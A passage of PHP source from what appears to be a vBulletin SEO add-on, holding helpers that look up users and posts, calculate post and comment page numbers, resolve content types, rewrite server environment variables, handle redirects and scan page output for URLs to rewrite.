				self::$cache['userinfo'][$arr['userid']] = self::$cache['usernames'][strtolower($arr['username'])] = $arr;
			}
		}

		if (!empty($userNames) AND strpos(self::$cache['rawurls']['memberprofile']['MemberProfile'], '%user_id%') !== false)
		{
			foreach ($userNames as $key => $userName)
			{
				if (($info = self::$datastore->fetch('usernames.' . strtolower($userName))) === false)
				{
					// We don't have this cached
					continue;
				}

				// Cache this info
				self::$cache['userinfo'][$info['userid']] = self::$cache['usernames'][strtolower($info['username'])] = $info;
			}

			foreach ($userNames as $key => &$userName)
			{
				if (isset(self::$cache['usernames'][strtolower($userName)]))
				{
					// We don't need this
					unset($userNames[$key]);
				}

				// Ensure these are all ints
				$userName = "'" . str_replace("'", "\\'", str_replace("\\", "\\\\", $userName)) . "'";
			}

			if (!empty($userNames))
			{
				$info = self::$db->generalQuery('
					SELECT userid, username
					FROM $user
					WHERE username IN (' . implode(',', $userNames) . ')
				', false);
				foreach ($info as $arr)
				{
					// Cache this info
					self::$cache['userinfo'][$arr['userid']] = self::$cache['usernames'][strtolower($arr['username'])] = $arr;
				}
			}
		}
	}

	/**
	 * Fetches the post info based on parameters. Basically just a shorthand wrapper
	 *
	 * @param string $url
	 *
	 * @return mixed
	 */
	public static function getThreadPostInfo($postIds, $force = false)
	{
		$postInfo = array();

		if (!$postIds)
		{
			// We need at least one id
			return $postInfo;
		}

		if (!is_array($postIds))
		{
			// Ensure this is an array
			$postIds = array($postIds);
		}

		$queryList = array();
		foreach ($postIds as $key => $postId)
		{
			if (
				(
					!isset(self::$cache['post'][$postId]) AND
					!isset(self::$cache['post'][$postId]['threadid'])
				) OR
				$force
			)
			{
				// Ensure this is done
				$queryList[$key] = intval($postId);

				// Reset the post cache
				self::$cache['post'][$postId] = array();
			}
		}

		if (empty($queryList))
		{
			if (count($postIds) == 1)
			{
				// We have only one, return only one
				$postInfo = self::$cache['post'][$postIds[0]];
			}
			else
			{
				foreach ($postIds as $key => $postId)
				{
					// Create this array
					$postInfo[$postId] = self::$cache['post'][$postId];
				}
			}

			// We need at least one id
			return $postInfo;
		}

		$info = self::$db->generalQuery('
			SELECT post.postid, post.pagetext, thread.threadid, thread.title, post.dateline
			FROM $thread AS thread
			LEFT JOIN $post AS post USING(threadid)
			WHERE post.postid IN(' . implode(',', $queryList) . ')
		', false);
		foreach ($info as $arr)
		{
			if (in_array($arr['postid'], (array)self::$cache['_objectIds']['prepostthread_ids']))
			{
				if (function_exists('fetch_coventry'))
				{
					if ($coventry = fetch_coventry('string'))
					{
						$where = " AND post.userid NOT IN ($coventry)";
					}

					// Post order
					$postOrder = $vbulletin->userinfo['postorder'];
				}
				else
				{
					// Post order
					$postOrder = 0;
				}

				$info2 = self::$db->generalQuery('
					SELECT COUNT(*) AS earlierPosts
					FROM $post AS post
					WHERE post.threadid = ' . $arr['threadid'] . '
						AND post.visible = 1
						AND post.dateline ' . ($postOrder == 0 ? '<= ' : '>= ') . $arr['dateline'] . '
						' . $where . '
				', true);

				// Add additional cache elements
				$arr['earlierPosts'] = $info2['earlierPosts'];
				$arr['postOrder'] = isset($postOrder) ? $postOrder : 0;
			}

			self::$cache['post'][$arr['postid']] = $arr;
			self::$cache['_objectIds']['postthreads'][] = $arr['threadid'];
		}

		if (count($postIds) == 1)
		{
			// We have only one, return only one
			$postInfo = self::$cache['post'][$postIds[0]];
		}
		else
		{
			foreach ($postIds as $key => $postId)
			{
				// Create this array
				$postInfo[$postId] = self::$cache['post'][$postId];
			}
		}

		return $postInfo;
	}

	/**
	 * Gets the page the specified post is on
	 *
	 * @param array $threadInfo
	 * @param integer $postId
	 *
	 * @return integer
	 */
	public static function getPostPage($threadInfo, $postId)
	{
		if (!isset($GLOBALS['vbulletin']))
		{
			if ($_COOKIE[self::$config['_cookieprefix'] . 'userid'])
			{
				$userId = intval($_COOKIE[self::$config['_cookieprefix'] . 'userid']);
				if (($userInfo = self::$datastore->fetch('postpage.' . $userId)) === false)
				{
					// Grab our page settings
					$userInfo = self::$db->generalQuery('
						SELECT `maxposts`, `threadedmode`, `options`
						FROM `$user`
						WHERE `userid` = ' . $userId . '
					', true);
					$userInfo['postorder'] = (bool)((int)$userInfo['options'] & 32768);

					// Build the cache
					self::$datastore->build('postpage.' . $userId, $userInfo);
				}
			}
			else
			{
				// Guest
				$userInfo = array('maxposts' => self::$config['maxposts'], 'postorder' => 0);
			}
		}
		else
		{
			// We have vB info
			$userInfo = $GLOBALS['vbulletin']->userinfo;
		}

		if (!isset(self::$cache['post'][$postId]))
		{
			// We definitely need this now
			self::$cache['_objectIds']['prepostthread_ids'][] = $postId;

			// Ensure we have this
			self::getThreadPostInfo($postId);
		}

		// Set this
		$postInfo = self::$cache['post'][$postId];

		if ($userInfo['maxposts'] <= 0)
		{
			// Set forum maxposts
			$userInfo['maxposts'] = self::$config['maxposts'];
		}

		$replyCount = intval(preg_replace('#[^0-9]#', '', $threadInfo['replycount'])) + 1;
		$page = 1;

		if ($replyCount <= $userInfo['maxposts'])
		{
			// This will always be page 1
			return $page;
		}

		// earlierposts = preposts
		if (!$postInfo['earlierPosts'] AND isset($threadInfo['replycount']))
		{
			if ($threadInfo['firstpostid'] == $postInfo['postid'])
			{
				$postInfo['earlierPosts'] = 1;
			}

			if ($threadInfo['lastpostid'] == $postInfo['postid'] OR $userInfo['maxposts'] > $replyCount)
			{
				$postInfo['earlierPosts'] = $replyCount + 1;
			}
		}

		if ($userInfo['postorder'] == 1 AND !$postInfo['postOrder'] AND isset($postInfo['earlierPosts']))
		{
			$postInfo['earlierPosts'] = $replyCount - $postInfo['earlierPosts'] + 2;
		}

		if (isset($postInfo['earlierPosts']) AND $page <= 1)
		{
			$page = ($userInfo['maxposts'] != 0 ? @ceil($postInfo['earlierPosts'] / $userInfo['maxposts']) : 0);
		}

		return $page;
		/*
		// See if we can't save some queries
		switch ($postId)
		{
			case $threadInfo['firstpostid']:
				// First post in thread
				$page = ($userInfo['postorder'] == 1 ? ceil($replyCount / $userInfo['maxposts']) : 1);
				break;

			case $threadInfo['lastpostid']:
				// Last post in thread
				$page = ($userInfo['postorder'] == 0 ? ceil($replyCount / $userInfo['maxposts']) : 1);
				break;

			default:
				if (($postPage = self::$datastore->fetch('postpage2.' . $userInfo['maxposts'] . '.' . $userInfo['postorder'] . '.' . $postId . '.' . $threadInfo['threadid'])) === false)
				{
					// Grab our page settings
					$postPage = self::$db->generalQuery('
						SELECT CEIL(COUNT(*) / ' . $userInfo['maxposts'] . ') AS page
						FROM $post
						WHERE postid ' . ($userInfo['postorder'] == 1 ? '>=' : '<=') . ' ' . $postId . '
							AND threadid = ' . $threadInfo['threadid'] . '
					', true);

					// Build the cache
					self::$datastore->build('postpage2.' . $userInfo['maxposts'] . '.' . $userInfo['postorder'] . '.' . $postId . '.' . $threadInfo['threadid'], $postPage);
				}

				$page = $postPage['page'];
				break;
		}
		*/

		return $page;
	}

	/**
	 * Fetches the user info based on parameters
	 *
	 * @param string $url
	 *
	 * @return mixed
	 */
	public static function getPicturePage($pictureid, $commentid)
	{
		$perpage = intval(self::$config['pc_perpage']);

		$hook_query_join = $hook_query_where = '';
		if (intval(self::$config['templateversion']) == 4)
		{
			// vB4
			$hook_query_where = 'AND attachment.attachmentid = ' . intval($pictureid);
			$hook_query_join = 'LEFT JOIN $attachment AS attachment USING(filedataid)';
		}
		else
		{
			// vB3
			$hook_query_where = 'AND pictureid = ' . intval($pictureid);
		}

		//if (($count = self::$datastore->fetch('picturecomment.' . $pictureid . '.' . $commentid)) === false)
		//{
			// Grab our comment count
			$count = self::$db->generalQuery('
				SELECT COUNT(*) AS comments
				FROM $picturecomment AS picturecomment
				' . $hook_query_join . '
				WHERE picturecomment.state = \'visible\'
					AND picturecomment.commentid <= ' . intval($commentid) . '
					' . $hook_query_where . '
			');

			// Build the cache
			//self::$datastore->build('picturecomment.' . $pictureid . '.' . $commentid, $count);
		//}

		return $perpage ? ceil($count['comments'] / $perpage) : 1;
	}

	/**
	 * Fetches the group message page info based on parameters
	 *
	 * @param string $url
	 *
	 * @return mixed
	 */
	public static function getGroupMessagePage(&$discussionid, $groupmessageid)
	{
		global $vbulletin;

		//if (($commentCount = self::$datastore->fetch('groupmessagepage.' . $discussionid . '.' . $groupmessageid . '.' . $vbulletin->userinfo['userid'])) === false)
		//{
			$commentCount = 0;
			$gotGroup = false;
			if (self::$cache['groupsdis'])
			{
				foreach (self::$cache['groupsdis'] as $groupInfo)
				{
					if ($groupInfo['gmid'] != $groupmessageid AND $groupInfo['lastpostid'] != $groupmessageid)
					{
						// Skip this
						continue;
					}

					// Ensure we don't query needlessly
					$gotGroup = true;

					// Ensure this is set
					$discussionid = $discussionid ? $discussionid : $groupInfo['discussionid'];

					if (isset($groupInfo['replies']))
					{
						// We have replies in the info
						$commentCount = $groupInfo['replies'] + 1;
					}

					// Grab what we need to check for mod perms
					include_once(DIR . '/includes/functions_socialgroup.php');

					if ($groupInfo['moderation'] AND fetch_socialgroup_modperm('canmoderategroupmessages', $groupInfo))
					{
						// Comments under moderation
						$commentCount += $groupInfo['moderation'];
					}

					if ($groupInfo['deleted'] AND fetch_socialgroup_modperm('canviewdeleted', $groupInfo))
					{
						// Soft deleted comments
						$commentCount += $groupInfo['deleted'];
					}
					break;
				}
			}

			if (!$gotGroup)
			{
				// Zero of the comments
				$commentCount = 0;

				// Get group message info
				if ($groupMessage = self::$db->generalQuery('
					SELECT *
					FROM $groupmessage
					WHERE gmid = ' . intval($groupmessageid) . '
				') AND $groupMessage['discussionid'])
				{
					// Count number of comments
					$numComments = self::$db->generalQuery('
						SELECT COUNT(*) AS comments
						FROM $groupmessage
						WHERE discussionid = ' . $groupMessage['discussionid'] . '
							AND state = \'visible\'
							AND dateline <= ' . $groupMessage['dateline'] . '
					');

					// Shorthand
					$commentCount = intval($numComments['comments']);
				}
			}

			// Build the cache
			//self::$datastore->build('groupmessagepage.' . $discussionid . '.' . $groupmessageid . '.' . $vbulletin->userinfo['userid'], $commentCount);
		//}

		$perpage = intval(self::$config['gm_perpage']);
		return ($perpage ? ceil($commentCount / $perpage) : 1);
	}

	/**
	 * Fetches the group page info based on parameters
	 *
	 * @param string $url
	 *
	 * @return mixed
	 */
	public static function getGroupPage($groupid, $groupmessageid)
	{
		//if (($numComments = self::$datastore->fetch('grouppage.' . $groupid . '.' . $groupmessageid)) === false)
		//{
			// Get group message info
			$groupMessage = self::$db->generalQuery('
				SELECT *
				FROM $groupmessage
				WHERE gmid = ' . intval($groupmessageid) . '
					 AND groupid = ' . intval($groupid) . '
			');

			// Count number of comments
			$numComments = self::$db->generalQuery('
				SELECT COUNT(*) AS comments
				FROM $groupmessage
				WHERE groupid = ' . $groupid . '
					AND state = \'visible\'
					AND dateline >= ' . $groupMessage['dateline'] . '
			');

			// Build the cache
			self::$datastore->build('grouppage.' . $groupid . '.' . $groupmessageid, $numComments);
		//}

		$perpage = intval(self::$config['sg_perpage']);
		return ($perpage ? ceil($numComments / $perpage) : 1);
	}

	/**
	 * Grabs content ID from attachment info
	 *
	 * @param array $attachmentInfo
	 *
	 * @return mixed
	 */
	public static function getContentId($attachmentInfo)
	{
		if (isset($attachmentInfo['albumid']))
		{
			return $attachmentInfo['albumid'];
		}
		else if (isset($attachmentInfo['groupid']))
		{
			return $attachmentInfo['groupid'];
		}
		else
		{
			return $attachmentInfo['contentid'];
		}
	}

	/**
	 * Grabs content ID from attachment info
	 *
	 * @param array $attachmentInfo
	 *
	 * @return mixed
	 */
	public static function getContentType($attachmentInfo)
	{
		if ($attachmentInfo['albumid'])
		{
			// Album
			return 'album';
		}
		else if ($attachmentInfo['groupid'])
		{
			// Social group picture file
			return 'group';
		}
		else if (intval(self::$config['templateversion']) == 4)
		{
			if (!$attachmentInfo['contenttypeid'] OR $attachmentInfo['contenttypeid'] < 3)
			{
				// Forum attachment
				return 'forum';
			}

			// Get our content type
			return self::getContentTypeById($attachmentInfo['contenttypeid']);
		}

		// vB3 lands here
		return 'forum';
	}

	/**
	 * Grabs content type from ID
	 *
	 * @param integer $contenttypeid
	 *
	 * @return string
	 */
	public static function getContentTypeById($contenttypeid)
	{
		if (($packages = self::$datastore->fetch('pgkinfo')) === false)
		{
			// We don't have this cached
			$packages = self::$db->generalQuery('SELECT * FROM $package', false);

			// Build the cache
			self::$datastore->build('pgkinfo', $packages);
		}

		if (($contenttypes = self::$datastore->fetch('contenttype')) === false)
		{
			// We don't have this cached
			$contenttypes = self::$db->generalQuery('SELECT * FROM $contenttype', false);

			// Build the cache
			self::$datastore->build('contenttype', $contenttypes);
		}

		$contentTypeIds = $packageLookup = array();
		foreach ($packages as $package)
		{
			// Store class by packageid
			$packageLookup[$package['packageid']] = $package['class'];
		}

		foreach ($contenttypes as $contenttype)
		{
			// Index this array properly
			$contentTypeIds[$packageLookup[$contenttype['packageid']] . '_' . $contenttype['class']] = $contenttype['contenttypeid'];
		}

		switch ($contenttypeid)
		{
			case $contentTypeIds['vBForum_Album']:
				return 'album';
				break;

			case $contentTypeIds['vBForum_SocialGroup']:
				return 'group';
				break;

			case $contentTypeIds['vBBlog_BlogEntry']:
				return 'blog';
				break;

			case $contentTypeIds['vBCms_Section']:
				return 'cms_section';
				break;

			case $contentTypeIds['vBCms_Article']:
				return 'cms_article';
				break;

			default:
				return 'forum';
				break;
		}
	}

	/**
	 * Updates the server environment variables based on the resolved URL
	 *
	 * @param string $url
	 * @param boolean $seo
	 *
	 * @return mixed
	 */
	public static function updateEnvironment($url)
	{
		if (substr($url, 0, 1) == '/')
		{
			// We're trying for a directory
			$page = $url;
		}
		else
		{
			// Set the normalised page
			$page = DBSEO_URL_SCRIPT_PATH . $url;

			if (strpos($page, '../') !== false)
			{
				// We have directory navigation
				do
				{
					$ap = $page;
					$page = preg_replace('#/?[^/]*/\.\.#', '', $ap, 1);
				}
				while ($page != $ap);
			}
		}

		if (strpos($page, '?') !== false)
		{
			// We have a query
			@list($basepage, $query) = explode('?', $page, 2);
		}
		else
		{
			// No query needed
			$basepage = $page;
			$query = '';
		}

		$basepage = str_replace('//', '/', $basepage);
		preg_match('#([^/]+)$#', $basepage, $matches);

		// This is used in certain URL lookups
		$_SERVER['DBSEO_FILE'] = isset($matches[1]) ? (file_exists($matches[1]) ? $matches[1] : '') : '';

		// Resolve the new page path
		$pagepath = /*dirname(DBSEO_CWD)*/ DBSEO_CWD . '/' . str_replace(DBSEO_URL_SCRIPT_PATH, '', $basepage);

		// Backup the current request URI
		$_SERVER['DBSEO_URI'] = $_SERVER['REQUEST_URI'];

		foreach (array(
			'REQUEST_URI' 		=> $page,
			'SCRIPT_NAME' 		=> $basepage,
			'PHP_SELF' 			=> $basepage,
			'PATH_INFO' 		=> $basepage,
			'SCRIPT_FILENAME' 	=> $pagepath,
			'PATH_TRANSLATED' 	=> $pagepath,
		) as $key => $val)
		{
			// Set us some variables
			$_SERVER[$key] = $_ENV[$key] = $GLOBALS[$key] = $val;
		}

		foreach (array(
			'REDIRECT_QUERY_STRING',
			'REDIRECT_URL'
		) as $toUnset)
		{
			// Get rid of things we no longer want
			unset($_SERVER[$toUnset], $_ENV[$toUnset], $GLOBALS[$toUnset]);
		}

		// Set the arg query string
		$_SERVER['argv'][0] = $GLOBALS['argv'][0] = $query;

		if ($query)
		{
			// Set the various query string variables
			$_SERVER['QUERY_STRING'] = $_ENV['QUERY_STRING'] = $GLOBALS['QUERY_STRING'] = $query;

			// Parse the query into neat little key->value pairs with automagic urldecode
			parse_str($query, $params);

			foreach ($params as $name => $value)
			{
				if ($_REQUEST[$name])
				{
					// Already set
					continue;
				}

				// Set this now instead
				$_REQUEST[$name] = $_GET[$name] = $value;
			}
		}
	}

	/**
	 * Updates a FB Meta tag
	 *
	 * @param string $page
	 * @param string $meta
	 * @param string $content
	 *
	 * @return void
	 */
	public static function updateFBMeta(&$page, $meta, $content)
	{
		if (!function_exists('is_facebookenabled') OR !is_facebookenabled())
		{
			// We don't have FB
			return;
		}

		// Update the page with the new meta content
		$page = preg_replace('#(<meta property="og:' . $meta . '".*?content=)"[^"]*#is', '$1"' . $content, $page);
	}

	/**
	 * Converts a URL to a full URL
	 *
	 * @param string $url
	 * @param string $thisDomain
	 *
	 * @return str
	 */
	public static function createFullUrl($url, $thisDomain = false)
	{
		return DBSEO_Url_Create::createFull($url, $thisDomain);
	}

	/**
	 * Handles getting / setting highlight parameters
	 *
	 * @param int $type
	 *
	 * @return boolean
	 */
	public static function checkHighlight($isSetter)
	{
		if ($isSetter)
		{
			if (!isset($_COOKIE) OR !isset($_GET['highlight']))
			{
				// We don't have any highlights
				return false;
			}

			// Keep it secret! Keep it safe!
			setcookie(self::$config['_cookieprefix'] . 'dbseo_highlight', $_GET['highlight']);
			$_COOKIE[self::$config['_cookieprefix'] . 'dbseo_highlight'] = $_GET['highlight'];
		}
		else
		{
			if (!isset($_COOKIE[self::$config['_cookieprefix'] . 'dbseo_highlight']))
			{
				// We don't have a cookie
				return false;
			}

			// Was it secret? Was it safe?
			setcookie(self::$config['_cookieprefix'] . 'dbseo_highlight', '');
			$_GET['highlight'] = $_REQUEST['highlight'] = $_COOKIE[self::$config['_cookieprefix'] . 'dbseo_highlight'];
		}

		return true;
	}

	/**
	 * Handles getting / setting mode parameters
	 *
	 * @param int $type
	 *
	 * @return boolean
	 */
	public static function checkMode($isSetter)
	{
		if ($isSetter)
		{
			if (!isset($_COOKIE) OR !isset($_GET['mode']))
			{
				// We don't have any modes
				return false;
			}

			// Keep it secret! Keep it safe!
			setcookie(self::$config['_cookieprefix'] . 'dbseo_mode', $_GET['mode']);
			$_COOKIE[self::$config['_cookieprefix'] . 'dbseo_mode'] = $_GET['mode'];
		}
		else
		{
			if (!isset($_COOKIE[self::$config['_cookieprefix'] . 'dbseo_mode']))
			{
				// We don't have a cookie
				return false;
			}

			// Was it secret? Was it safe?
			setcookie(self::$config['_cookieprefix'] . 'dbseo_mode', '');
			$_GET['mode'] = $_REQUEST['mode'] = $_COOKIE[self::$config['_cookieprefix'] . 'dbseo_mode'];
		}

		return true;
	}

	/**
	 * Execute a 301 redirect to a new URL
	 *
	 * @param int $type
	 *
	 * @return mixed
	 */
	public static function safeRedirect($url, $paramsToUnset = array(), $unsetAllParams = false, $redirectCode = 301)
	{
		/*
		echo "<pre>";
		debug_print_backtrace();
		echo "<br />";
		echo $url;
		die();
		*/

		if (defined('VBSEO_UNREG_EXPIRED'))
		{
			// Compatibility with things like ForumRunner and other such items
			return;
		}

		if (self::$config['dbtech_dbseo_enable_utf8'] AND preg_match('#&\#?[a-z\d]+;#i', $url))
		{
			// Ensure this is using the correct characters
			$url = html_entity_decode($url, ENT_COMPAT | ENT_HTML401, 'UTF-8');
		}
		else if (!self::$config['dbtech_dbseo_enable_utf8'] AND !self::$config['dbtech_dbseo_filter_nonlatin_chars'])
		{
			// Just in case we have those chars
			$url = utf8_encode($url);
		}

		//$forumRoot = DBSEO_URL_BASE_PATH;
		$forumRoot = self::$config['_bburl'];
		if (substr($forumRoot, -1) != '/')
		{
			$forumRoot .= '/';
		}

		if (!$unsetAllParams)
		{
			$paramsToUnset = array_merge($paramsToUnset, array(
				'grab_output', 'goto',
				'vbseourl', 'vbseorelpath', 'vbseoaddon', # Mostly for compat purposes
				'dbseourl', 'dbseorelpath', 'dbseoaddon',
			));

			if (self::$config['_stripsessionhash'])
			{
				// Strip the session hash
				$paramsToUnset[] = 's';
			}
		}

		$queryString = $_SERVER['QUERY_STRING'];
		if (strpos($url, '?') !== false)
		{
			list($url, $queryString) = explode('?', $url);
		}

		// Grab the parameters from the query string if we have any
		$params = $queryString ? explode('&', str_replace('&amp;', '&', preg_replace('|#.*|', '', $queryString))) : array();

		$requestString = array();
		foreach ($params as $param)
		{
			list($key, $value) = explode('=', $param, 2);

			if (!$unsetAllParams AND in_array($key, $paramsToUnset))
			{
				// Skip this param
				continue;
			}

			if ($unsetAllParams AND strpos($key, 'utm_') === false)
			{
				// Skip this param
				continue;
			}

			if (strpos($key, 'redirect_') !== false)
			{
				// Skip this param
				continue;
			}

			if (!$key AND !$value)
			{
				// Skip this param
				continue;
			}

			// Recreate the request string
			$requestString[] = $key . '=' . $value;
		}

		if ($url != '/' AND substr($url, 0, 1) == '/')
		{
			$url = preg_replace('#(://[^/]*)(.*)$#', '$1', $forumRoot) . $url;
		}

		$fulluri = ((strpos($url, '://') !== false) ? '': $forumRoot) . ($url != '/' ? $url : '');
		if ($requestString)
		{
			$fulluri = preg_replace('#^([^\#]*)#', '$1?' . implode('&', $requestString), $fulluri);
		}

		$fulluri = preg_replace('#[\r\n]#', '', $fulluri);

		$useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
		if (
			//strpos($fulluri, '#') !== false AND
			strpos($useragent, 'mac') !== false AND
			strpos($useragent, 'applewebkit') !== false AND
			strpos($useragent, 'safari') !== false
		)
		{
			// Because Safari on Mac is a bad person.
			$redirectCode = 303;
		}

		if ($redirectCode == 303 AND $_SERVER['SERVER_PROTOCOL'] == 'HTTP/1.0')
		{
			$redirectCode = 302;
		}

		header("Location: $fulluri", 0, $redirectCode);

		if (self::$config['addheaders'] AND (SAPI_NAME == 'cgi' OR SAPI_NAME == 'cgi-fcgi'))
		{
			// see #24779
			switch($redirectCode)
			{
				case 301:
					header('Status: 301 Moved Permanently');
					header('HTTP/1.x 301 Moved Permanently');
				case 302:
					header('Status: 302 Found');
					header('HTTP/1.x 302 Found');
				case 303:
					header('Status: 303 See Other');
					header('HTTP/1.x 303 See Other');
					break;
			}
		}

		exit();
	}

	/**
	 * Trap the output buffer for processing
	 *
	 * @param text $buffer
	 * @param boolean $isXML
	 *
	 * @return mixed
	 */
	public static function outputHandler($buffer, $isXML = false)
	{
		if (!self::$config['_outputHandled'])
		{
			// Ensure this only runs once
			self::$config['_outputHandled'] = true;

			// Determine if we're passing XML
			$testXML = substr($buffer, 0, 5) == '<?xml';

			// Store whether this was an XML file
			self::$config['_isXML'] = $isXML OR $testXML;

			if (preg_match_all('#<[^>]*?[ \<\[]data="(.*?)"#is', $buffer, $matches))
			{
				foreach ($matches[1] as $match)
				{
					$match = html_entity_decode($match);
					$match = self::processContent($match);
					$buffer = str_replace($match, function_exists('htmlspecialchars_uni') ? htmlspecialchars_uni($match) : htmlspecialchars($match), $buffer);
				}
			}
			else
			{
				// Just process it as-is
				$buffer = self::processContent($buffer);
			}

			$buffer = preg_replace('#([\";]|\&quot\;)(images/)#s', '$1' . self::$config['_bburl'] . '/$2', $buffer);
			if ($testXML AND (!function_exists('headers_list') OR preg_match('#\|content-length\:#i', implode('|', headers_list()))))
			{
				// We should add a content length
				@header('Content-Length: ' . strlen($buffer));
			}
		}
		return $buffer;
	}

	/**
	 * Processes the contents and rewrites URLs as needed
	 *
	 * @param text $content
	 *
	 * @return mixed
	 */
	public static function processContent(&$content, $isFinal = false)
	{
		if (!self::$config['dbtech_dbseo_active'])
		{
			// We've disabled the mod
			return $content;
		}

		if ($_POST['do'] == 'editorswitch')
		{
			// We don't want to rewrite editor
			return $content;
		}

		if (isset(self::$config['_process']) AND self::$config['_process'])
		{
			// We've already processed content
			return $content;
		}

		if ($isFinal)
		{
			// Flag that we've processed content
			self::$config['_process'] = true;
		}

		// Turn off all error reporting
		//error_reporting(0);

		// Let the default error handler take over
		//restore_error_handler();

		global $vbulletin;

		$_noClean = array(
			'styleid' 	=> array(),
			'view' 		=> array('hybrid', 'threaded', 'linear'),
			'mode' 		=> array('hybrid', 'threaded', 'linear'),
		);

		if (THIS_SCRIPT == 'member')
		{
			// Don't
			$_noClean['do'] = array('getinfo');
		}

		foreach ($_noClean as $key => $arr)
		{
			if (isset($_GET[$key]) AND (!$arr OR in_array($_GET[$key], $arr)))
			{
				// Redirect
				self::safeRedirect(DBSEO_REQURL, array_keys($_noClean));
			}
		}

		/*DBTECH_PRO_START*/
		if (DBSEO_SPIDER)
		{
			// Track ourselves a spider hit!
			self::trackSpider();
		}
		/*DBTECH_PRO_END*/

		// Back this up so we have something to work with
		$_content = $content;

		// Prefix it with the bburl
		$_prefix = (isset(self::$config['dbtech_dbseo_rewrite_texturls']) OR self::$config['_isXML']) ? '' : '[\'"](?:' . self::$config['_bburl'] . '/?)?';

		if (!self::$config['dbtech_dbseo_rewrite_texturls'] AND !self::$config['_isXML'])
		{
			preg_match_all('#(?:href=|src=|\.open\(|location=)["\'].*?["\']#is', $_content, $matches, PREG_PATTERN_ORDER);
			$_content = implode(" ", $matches[0]);
		}

		if (preg_match_all('#\bt-(\d+)\.html#', $_content, $matches))
		{
			// Archive urls
			self::$cache['_objectIds']['thread_ids'] = $matches[1];
		}

		if (self::$config['dbtech_dbseo_rewrite_memberprofile'])
		{
			if (preg_match_all('#member\.php\?[^"\']*?u(?:serid)?=(\d+)#', $_content, $matches))
			{
				// User ID link
				self::$cache['_objectIds']['user_ids'] = $matches[1];
			}

			if (preg_match_all('#member\.php\?[^"]*?username=([^"\']+)#', $_content, $matches))
			{
				// User name link
				self::$cache['_objectIds']['user_names'] = $matches[1];
			}

			if (preg_match_all('#converse\.php\?[^"\']*?u=(\d+)[^"\']*?u2=(\d+)#', $_content, $matches))
			{
				// Visitor message users
				self::$cache['_objectIds']['user_ids'] = is_array(self::$cache['_objectIds']['user_ids']) ? self::$cache['_objectIds']['user_ids'] : array();
				self::$cache['_objectIds']['user_ids'] = array_merge(self::$cache['_objectIds']['user_ids'], $matches[1], $matches[2]);
			}

			if (preg_match_all('#blog\.php\?[^"\']*?u=(\d+)#', $_content, $matches))
			{
				// Blogs
				self::$cache['_objectIds']['user_ids'] = is_array(self::$cache['_objectIds']['user_ids']) ? self::$cache['_objectIds']['user_ids'] : array();
				self::$cache['_objectIds']['user_ids'] = array_merge(self::$cache['_objectIds']['user_ids'], $matches[1]);
			}

			if (preg_match_all('#member\.php\?[^"]*?find=lastposter.*?t(?:hreadid)?=(\d+)#', $_content, $matches))
			{
				// Threads
				self::$cache['_objectIds']['thread_last'] = $matches[1];
				self::$cache['_objectIds']['thread_ids'] = is_array(self::$cache['_objectIds']['thread_ids']) ? self::$cache['_objectIds']['thread_ids'] : array();
				self::$cache['_objectIds']['thread_ids'] = array_merge(self::$cache['_objectIds']['thread_ids'], self::$cache['_objectIds']['thread_last']);
			}

			if (preg_match_all('#member\.php\?[^"]*?find=lastposter.*?f=(\d+)#', $_content, $matches))
			{
				// Last poster
				self::$cache['_objectIds']['forum_last'] = is_array(self::$cache['_objectIds']['forum_last']) ? self::$cache['_objectIds']['forum_last'] : array();
				self::$cache['_objectIds']['forum_last'] = array_merge(self::$cache['_objectIds']['forum_last'], $matches[1]);
			}
		}

		if (self::$config['dbtech_dbseo_rewrite_album'])
		{
			if (preg_match_all('#album\.php\?[^"\']*?albumid=(\d+)#', $_content, $matches))
			{
				// Album url
				self::$cache['_objectIds']['album'] = $matches[1];
			}

			if (preg_match_all('#album\.php\?[^"\']*?' . self::$config['_pictureid'] . '=(\d+)#', $_content, $matches))
			{
				// Picture URL
				self::$cache['_objectIds'][self::$config['_picturestorage']] = is_array(self::$cache['_objectIds'][self::$config['_picturestorage']]) ? self::$cache['_objectIds'][self::$config['_picturestorage']] : array();
				self::$cache['_objectIds'][self::$config['_picturestorage']] = array_merge(self::$cache['_objectIds'][self::$config['_picturestorage']], $matches[1]);
			}
		}

		if (self::$config['dbtech_dbseo_rewrite_socialgroup'] OR self::$config['dbtech_dbseo_rewrite_memberprofile'])
		{
			if (preg_match_all('#picture\.php\?[^"\']*?' . self::$config['_pictureid'] . '=(\d+)#', $_content, $matches))
			{
				// Picture URL
				self::$cache['_objectIds'][self::$config['_picturestorage']] = is_array(self::$cache['_objectIds'][self::$config['_picturestorage']]) ? self::$cache['_objectIds'][self::$config['_picturestorage']] : array();
				self::$cache['_objectIds'][self::$config['_picturestorage']] = array_merge(self::$cache['_objectIds'][self::$config['_picturestorage']], $matches[1]);
			}
		}

		if (self::$config['dbtech_dbseo_rewrite_blog'])
		{
			if (preg_match_all('#blog\.php\?[^"]*?u=(\d+)#', $_content, $matches))
			{
				// Blog url
				self::$cache['_objectIds']['user_ids'] = is_array(self::$cache['_objectIds']['user_ids']) ? self::$cache['_objectIds']['user_ids'] : array();
				self::$cache['_objectIds']['user_ids'] = array_merge(self::$cache['_objectIds']['user_ids'],$matches[1]);
			}

			if (preg_match_all('#' . $_prefix . '(?:blog|entry)\.php\?[^"]*?b(?:logid)?=(\d+)#', $_content, $matches))
			{
				// Blog entry
				self::$cache['_objectIds']['blog_ids'] = $matches[1];
			}

			if (preg_match_all('#blog_attachment\.php\?[^"]*?attachmentid=(\d+)#', $_content, $matches))
			{
				// Blog attachment
				self::$cache['_objectIds']['blogatt_ids'] = $matches[1];
			}

			if (preg_match_all('#blog\.php\?[^"]*?cp=(\d+)#', $_content, $matches))
			{
				// Blog custom page
				self::$cache['_objectIds']['blogcustomblock'] = $matches[1];
			}

			if (preg_match_all('#blog\.php\?[^"]*?blogcategoryid=(\d+)#', $_content, $matches))
			{
				// Blog category id
				self::$cache['_objectIds']['blogcat_ids'] = $matches[1];
			}
		}

		if (self::$config['dbtech_dbseo_rewrite_announcement'] AND preg_match_all('#announcement\.php\?[^"]*?f(?:orumid)?=(\d+)#', $_content, $matches))
		{
			// Announcement
			self::$cache['_objectIds']['announcements'] = $matches[1];
		}

		if (self::$config['dbtech_dbseo_rewrite_socialgroup'])
		{
			if (preg_match_all('#group\.php\?[^"\']*?' . self::$config['_pictureid'] . '=(\d+)#', $_content, $matches))
			{
				// Picture url
				self::$cache['_objectIds'][self::$config['_picturestorage']] = is_array(self::$cache['_objectIds'][self::$config['_picturestorage']]) ? self::$cache['_objectIds'][self::$config['_picturestorage']] : array();
